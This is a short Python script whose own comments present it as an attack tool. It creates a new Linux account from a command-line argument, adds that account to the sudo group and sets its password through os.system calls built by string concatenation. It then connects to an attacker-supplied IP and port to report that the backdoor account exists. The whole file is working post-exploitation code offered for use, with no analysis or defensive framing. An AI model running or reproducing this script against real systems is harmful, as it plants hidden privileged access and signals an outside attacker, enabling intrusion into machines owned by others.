import os
import socket
import sys

newuser = sys.argv[1]
serv = sys.argv[2]
pp = int(sys.argv[3])


def create_usr():
    """
    This function allows creates an account specified in the program arguments and puts that user into the sudo group
    """
    cmd1 = "adduser " + newuser
    cmd2 = "usermod -aG sudo " + newuser
    cmd3 = "sudo passwd " + newuser
    os.system(cmd1)
    os.system(cmd2)
    os.system(cmd3)

def con_serv():
    """
    This function attempts to connect back to the attacking computer where it will let the attacker know that the account
    was created
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((serv, pp))
    m = "The user has been added to the system".encode()
    soc.send(m)

def main():
    if len(sys.argv) != 4:
        print("Bad input, please enter <username> <IP> <port>")
    else:
        create_usr()
        con_serv()


main()
